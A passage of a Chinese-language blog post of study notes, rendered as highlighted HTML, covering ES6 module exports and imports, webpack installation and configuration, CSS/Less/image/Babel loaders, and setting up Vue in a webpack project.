class="string">&#x27;running&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.export default</span></span><br><span class="line"><span class="comment">//某些情况下，一个模块中包含某个功能 我们不希望给这个功能命名 而且想让导入者可以自己来命名</span></span><br><span class="line"><span class="comment">//在同一个模块中只能有一个</span></span><br><span class="line"><span class="keyword">const</span> address = <span class="string">&#x27;bj&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> address;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mmm.js</span></span><br><span class="line"><span class="comment">//1.导入&#123;&#125;定义的变量</span></span><br><span class="line"><span class="keyword">import</span> &#123;flag&#125; <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xiaoming&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.直接导入export定义的变量</span></span><br><span class="line"><span class="keyword">import</span> &#123;num1, height&#125; <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.导入export的function</span></span><br><span class="line"><span class="keyword">import</span> &#123;mul,<span class="title class_">Person</span>&#125; <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p.<span class="title function_">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.导入export default 导入aaa.js默认导出的东西</span></span><br><span class="line"><span class="keyword">import</span> addr <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//5.统一全部导入</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> aaa <span class="keyword">from</span> <span class="string">&quot;./aaa.js&quot;</span>;</span><br><span class="line">aaa.<span class="property">flag</span>; </span><br></pre></td></tr></table></figure><h2 id="2.webpack详解">2.webpack详解<a title="#2.webpack详解" href="#2.webpack详解"></a></h2><h3 id="2.1-认识webpack">2.1 认识webpack<a title="#2.1-认识webpack" href="#2.1-认识webpack"></a></h3><p>At its core，webpack is a static module bundler for modern JavaScript applications</p><p>从本质上，<strong>webpack</strong>是一个现代的JavaScript应用的<strong>静态模块</strong>打包工具</p><ul><li>模块、打包<ul><li>打包工具：grunt、gulp、webpack</li></ul></li></ul><h4 id="2.1.1前端模块化">2.1.1前端模块化<a title="#2.1.1前端模块化" href="#2.1.1前端模块化"></a></h4><ul><li><p>除了ES6的模块化的底层是靠浏览器的支撑外，其他都需要借助别其他的工具，才能进行模块化开发</p></li><li><p>并且在通过模块化开发完成项目后，还需要处理模块间的各种依赖，并且将其进行整合打包</p></li><li><p>而webpack其中一个核心就是让我们可能进行模块化开发，并且回帮助我们处理模块间的依赖关系</p></li></ul><h4 id="2.1.2-打包">2.1.2 打包<a title="#2.1.2-打包" href="#2.1.2-打包"></a></h4><ul><li>将webpack中各种资源模块进行打包合并成一个/多个包</li><li>在打包过程中，还可以对资源进行处理，比如压缩图片、scss-&gt;css、将es6语法转换成es5语法等</li></ul><h4 id="2.1.3-和grunt/gulp的对比">2.1.3 和grunt/gulp的对比<a title="#2.1.3-和grunt/gulp的对比" href="#2.1.3-和grunt/gulp的对比"></a></h4><img src="https://s1.328888.xyz/2022/04/09/XOPH1.png"><h3 id="2.2-webpack的安装（p76）">2.2 webpack的安装（p76）<a title="#2.2-webpack的安装（p76）" href="#2.2-webpack的安装（p76）"></a></h3><p>webpack为了可以正常运行 必须依赖node环境</p><p>node环境为了可以正常的执行很多代码，必须其中包含各种依赖的包</p><p>npm工具（node packages manager）</p><ul><li>安装node.js Node.js自带了软件包管理工具npm<ul><li>查看node版本：cmd：node -v 版本大于8.9</li></ul></li><li>全局安装webpack（安装3.6.0 因为vue cli2依赖该版本）<ul><li>使用npm安装：cmd： npm install webpack@3.6.0 -g</li></ul></li><li>局部安装webpack<ul><li><code>--save-dev</code>是开发时依赖，项目打包后不需要使用的</li></ul></li><li>全局安装后，还需要局部安装：<ul><li>在终端直接执行webpack命令，使用的全局安装的webpack</li><li>当在package.json中定义了script时，其中包含了webpack命令，那么使用的是局部webpack</li></ul></li></ul><h3 id="2.3-webpack的起步-（p77）">2.3 webpack的起步 （p77）<a title="#2.3-webpack的起步-（p77）" href="#2.3-webpack的起步-（p77）"></a></h3><blockquote><p><strong>通过vs code 运行webpack进行打包时，报错webpack : 无法加载文件 D:\nodejs\node_global\webpack.ps1，因为在此系统上禁止运行脚本。</strong></p><p>解决方案：</p><ol><li>以管理员身份运行vs code</li><li>执行：get-ExecutionPolicy，显示Restricted，表示状态是禁止的</li><li>执行：set-ExecutionPolicy RemoteSigned</li><li>这时再执行get-ExecutionPolicy，就显示RemoteSigned</li></ol></blockquote><p>dist文件夹里的就是打包的东西，把这个给服务器就好了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="comment">//1.使用commonjs的模块化规范</span></span><br><span class="line"><span class="keyword">const</span> &#123; add, mul &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./mathUtils.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mul</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用es6的模块化规范</span></span><br><span class="line"><span class="keyword">import</span> &#123; name, age, height &#125; <span class="keyword">from</span> <span class="string">&quot;./info&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name, age, height);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mathUtils.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mul</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> num1 * num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; add, mul &#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//info.js</span></span><br><span class="line"><span class="comment">//es6的模块化</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">&quot;why&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> height = <span class="number">1.88</span>;</span><br></pre></td></tr></table></figure><blockquote><p>打包到./dist/dundle.js</p></blockquote><img src='https://s1.328888.xyz/2022/04/09/XaerO.jpg' style="zoom:67%;" ><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./dist/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2.4-webpack的配置（p78-82）">2.4 webpack的配置（p78-82）<a title="#2.4-webpack的配置（p78-82）" href="#2.4-webpack的配置（p78-82）"></a></h3><h4 id="2.4.1-入口出口的配置">2.4.1 入口出口的配置<a title="#2.4.1-入口出口的配置" href="#2.4.1-入口出口的配置"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.html同目录下 新建webpack.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//动态获取绝对路径 必须要有path包 下载npm init</span></span><br><span class="line"><span class="comment">//包名 当时：meetwebpack</span></span><br><span class="line"><span class="comment">//出口 当时：index.js</span></span><br><span class="line"><span class="comment">//会生成一个package.json  如果想依赖node.js 一般都会需要 </span></span><br><span class="line"><span class="comment">//这里path有依赖 这里会全局搜</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接用webpack代替webpack ./src/main.js ./dist/dunble.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在packae.js 中设置&quot;build:&#x27;webpack&#x27;&quot; 用npm run build 映射 webpack</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">//入口</span></span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">    <span class="comment">//出口</span></span><br><span class="line">    <span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="comment">//路径 不能使用相对路径 动态获取绝对路径 </span></span><br><span class="line">        <span class="comment">//对两路径进行拼接  __dirname 全局变量 保存当前文件的路径</span></span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        <span class="comment">//文件名</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;bundle.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2.4.2-局部安装webpack">2.4.2 局部安装webpack<a title="#2.4.2-局部安装webpack" href="#2.4.2-局部安装webpack"></a></h4><p>怎么直接在控制台打上webpack就能让main.js打包成bundle.js</p><p>因为全局webpack的版本可能跟本地不一样 所以还得下载个本地的webpack</p><blockquote><p>在package.json中 下载本地webpack后(npm install webpack@3.6.0 - - save-dev) 会自动生成</p><p>开发时依赖–“devDependencies”：{“webpack”：“^3.6.0”}</p><p>后面会讲到运行时依赖–“dependencies”:{}</p></blockquote><p>只要在命令行/cmd里面使用的都是终端 使用的都是全局的webpack ：webpack</p><p>在package.json定义的scripts优先运行本地  npm run build  / ./node_modules/webpack.config.js</p><img src='https://s1.328888.xyz/2022/04/09/XayZP.jpg'><img src='https://s1.328888.xyz/2022/04/09/Xau7q.jpg'><h3 id="2.5-loader的使用">2.5 loader的使用<a title="#2.5-loader的使用" href="#2.5-loader的使用"></a></h3><h4 id="2.5.1webpack中使用css文件的配置">2.5.1webpack中使用css文件的配置<a title="#2.5.1webpack中使用css文件的配置" href="#2.5.1webpack中使用css文件的配置"></a></h4><h5 id="2.5.1.1-介绍">2.5.1.1 介绍<a title="#2.5.1.1-介绍" href="#2.5.1.1-介绍"></a></h5><ul><li>加载css、图片、包括一些高级的将ES6转成ES5代码、将TypeScript转成ES5代码、将scss、less转成css、将.jsx、.vue转成js等等</li><li>这些webpack本身能力做不到，但其扩展对应的loader就可以</li></ul><p>loader使用过程：</p><ul><li>步骤一：通过npm安装需要使用的loader</li><li>步骤二：在webpack.config.js中的modules关键字下进行配置</li></ul><p>大部分loader可以在webpack官网中找到，并且学习对应的用法</p><h5 id="2.5.1.2-产生依赖">2.5.1.2 产生依赖<a title="#2.5.1.2-产生依赖" href="#2.5.1.2-产生依赖"></a></h5><p>因为要有依赖才能打包，所以在main.js设置css的依赖</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.依赖css文件</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./css/normal.css&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="2.5.1.3-loader">2.5.1.3 loader<a title="#2.5.1.3-loader" href="#2.5.1.3-loader"></a></h5><p>因为直接使用的话会报错 说没有找到适合的loader  然后就去官网https://webpack.js.org (英文网址)/<a href="https://webpack.js.com">https://webpack.js.com</a> （中文网址）找</p><blockquote><p>css-loaderrhttps://webpack.js.org/loaders/css-loader/只负责加载 不负责解析 生效</p></blockquote><blockquote><p>style-loaderhttps://webpack.js.org/loaders/style-loader/:将模块的导出作为样式添加到DOM</p></blockquote><blockquote><p>如果报UnhandledPromiseRejectionWarning: TypeError: this.getResolve is not a function</p><p>可能是loader版本过高 可以在install时下载 较低版本</p><p>npm install --save-dev css-loader@3.3.0</p><p>npm install --save-dev style-loader@1.0.0</p></blockquote><img src='https://s1.328888.xyz/2022/04/09/XaJkS.png' style="zoom:70%;" ><img src='https://s1.328888.xyz/2022/04/09/Xag9m.png' style="zoom:70%;" ><img src='https://s1.328888.xyz/2022/04/09/Xa9WA.png' style="zoom:70%;" ><h5 id="2.5.1.4-对配置文件的解释">2.5.1.4 对配置文件的解释<a title="#2.5.1.4-对配置文件的解释" href="#2.5.1.4-对配置文件的解释"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [&#123;</span><br><span class="line">        <span class="comment">//正则表达式：匹配所有css文件 去应用下面2loader</span></span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        <span class="comment">//css-loader只负责加载 不负责解析 生效</span></span><br><span class="line">        <span class="comment">//还得再下载一个style-loader:将模块的导出作为样式添加到DOM</span></span><br><span class="line">        <span class="comment">//使用多个loader时 从右到左</span></span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&quot;style-loader&quot;</span>, <span class="string">&quot;css-loader&quot;</span>],</span><br><span class="line">    &#125;, ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="2.5.2-less文件处理">2.5.2 less文件处理<a title="#2.5.2-less文件处理" href="#2.5.2-less文件处理"></a></h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//special.less</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@font-face</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="variable">@fontColor:</span> orange;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="variable">@font-face</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">@fontColor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.依赖less文件</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./css/special.less&#x27;</span>);</span><br></pre></td></tr></table></figure><p>文件编写–&gt;终端打包–&gt;报错 说要一个对应的loader处理文件 –&gt;less-loader@4.1.0–&gt;配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.less$/i</span>,</span><br><span class="line">            <span class="attr">use</span>: [&#123;</span><br><span class="line">                 <span class="attr">loader</span>: <span class="string">&quot;style-loader&quot;</span>,</span><br><span class="line">             &#125;, &#123;</span><br><span class="line">                 <span class="attr">loader</span>: <span class="string">&quot;css-loader&quot;</span>,</span><br><span class="line">             &#125;, &#123;</span><br><span class="line">                 <span class="attr">loader</span>: <span class="string">&quot;less-loader&quot;</span>, <span class="comment">// compiles Less to CSS</span></span><br><span class="line">             &#125;]</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><h4 id="2.5.3-图片处理">2.5.3 图片处理<a title="#2.5.3-图片处理" href="#2.5.3-图片处理"></a></h4><p>css引用图片–&gt;file loader–&gt;url loader + file loader@3.0.1–&gt;配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package.json</span></span><br><span class="line"><span class="attr">output</span>: &#123;</span><br><span class="line">        <span class="comment">//路径 不能使用相对路径 动态获取绝对路径 </span></span><br><span class="line">        <span class="comment">//对两路径进行拼接  __dirname 全局变量 保存当前文件的路径</span></span><br><span class="line">        <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        <span class="comment">//文件名</span></span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;bundle.js&#x27;</span>,</span><br><span class="line">        <span class="comment">//!!!只要在以后任何有url的地方都会在前面加上dist</span></span><br><span class="line">        <span class="attr">publicPath</span>: <span class="string">&#x27;dist/&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|gif)$/i</span>,</span><br><span class="line">                <span class="attr">use</span>: [&#123;</span><br><span class="line">                    <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">                    <span class="attr">options</span>: &#123;</span><br><span class="line">                        <span class="comment">//使用小于限制时，会将图片编译成base64位字符串 显示出来</span></span><br><span class="line">                        <span class="attr">limit</span>: <span class="number">5000</span>,</span><br><span class="line">                        <span class="comment">//若大于限制，会要使用&#x27;file roader&#x27;@3.0.1进行加载 安装就好</span></span><br><span class="line">                        <span class="comment">//base64不需要打包直接从网上获取</span></span><br><span class="line">                        <span class="comment">//但大于就会将图片进行打包放在dist中  哈希生成名字--&gt;32位hash值 防止名字重复</span></span><br><span class="line">                        <span class="comment">//所以要加上路径 在output里+“publicPath: &#x27;dist/&#x27;”</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;, ],</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure><p>处理生成的图片名称：</p><ul><li><p>将所有图片放在img，跟原来图片一样的名，同时防止重复</p><p>img/name.hash:8.ext</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">                <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|gif)$/i</span>,</span><br><span class="line">                <span class="attr">use</span>: [&#123;</span><br><span class="line">                    <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">                    <span class="attr">options</span>: &#123;</span><br><span class="line">                        <span class="attr">limit</span>: <span class="number">5000</span>,</span><br><span class="line">                        <span class="comment">//if img/name 那文件==name.png</span></span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;img/[name].[hash:8].[ext]&#x27;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;, ],</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure><h4 id="2.5.4-es6转es5的babel-loader">2.5.4 es6转es5的babel-loader<a title="#2.5.4-es6转es5的babel-loader" href="#2.5.4-es6转es5的babel-loader"></a></h4><p>官网babel loader–&gt;</p><p>安装：<code>npm install --save-dev babel-loader@7 babel-core babel-preset-es2015</code></p><p>配置webpack.config.js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">               <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">               <span class="comment">//排除 src外的文件夹</span></span><br><span class="line">               <span class="attr">exclude</span>: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">               <span class="attr">use</span>: &#123;</span><br><span class="line">                   <span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">                   <span class="attr">options</span>: &#123;</span><br><span class="line">                       <span class="attr">presets</span>: [<span class="string">&#x27;es2015&#x27;</span>]</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样的话 打包好的js 就没有es6属性了</p></blockquote><h3 id="2.6-webpack中配置vue">2.6 webpack中配置Vue<a title="#2.6-webpack中配置vue" href="#2.6-webpack中配置vue"></a></h3><h4 id="2.6.1-引入vue.js">2.6.1 引入vue.js<a title="#2.6.1-引入vue.js" href="#2.6.1-引入vue.js"></a></h4><p>要在项目中使用Vue.js，就需要对其产生依赖，所以先安装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install vue --save  <span class="comment">//因为后续在实际项目中会使用到vue，所以并不是开发时依赖的</span></span><br><span class="line"><span class="comment">//当时是 vue@2.5.21  我的是vue@2.6.12</span></span><br></pre></td></tr></table></figure><blockquote><p>会被安装到 node_modules里  就可以把vue当成一个模块</p></blockquote><p>然后在任何一个文件就可以引用 vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//5.使用Vue.js开发</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>  <span class="comment">//没有文件名 就会在 上述包里 找vue </span></span><br></pre></td></tr></table></figure><p>编写-&gt; 打包 -&gt; 打开 -&gt; 报错</p><p>原因：</p><blockquote><p>vue有两个版本 ：</p><ol><li>runtime-only 代码中不能有任何的template 不会编译</li><li>runtime-complier 可以编译template</li></ol><p>报的错就是 因为使用的就是runtime-only版本</p></blockquote><p>解决：</p><blockquote><p>修改webpack的配置 添加：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js  </span></span><br><span class="line"><span class="comment">//与entry同级</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">        <span class="comment">//别名</span></span><br><span class="line">        <span class="attr">alias</span>: &#123;</span><br><span class="line">            <span class="comment">//在进行 import Vue from &#x27;vue 操作时 会看vue是否指向 下面的文件夹 </span></span><br><span class="line">            <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure></blockquote><p>重新打包 -&gt;运行就可以了</p><h4 id="2.6.2-el和template的区别（一）">2.6.2 el和template的区别（一）<a title="#2.6.2-el和template的区别（一）" href="#2.6.2-el和template的区别（一）"></a></h4><ul><li>因为后面开发 只用一个index.html  在使用组件时 就必要的会修改index.html</li><li>但html模板在之后的开发中，不希望手动来频繁修改</li></ul><p>所以</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在html中只保留这个代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./dist/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在vue实例中 使用template  template会替换掉 el挂载的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`&lt;div&gt;&lt;h2&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;&lt;/div&gt;`</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;hello webpack!&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="2.6.3-完善">2.6.3 完善<a title="#2.6.3-完善" href="#2.6.3-完善"></a></h4><p>将上述</p><h5 id="抽取到组件中：">抽取到组件中：<a title="#抽取到组件中：" href="#抽取到组件中："></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">App</span> = &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    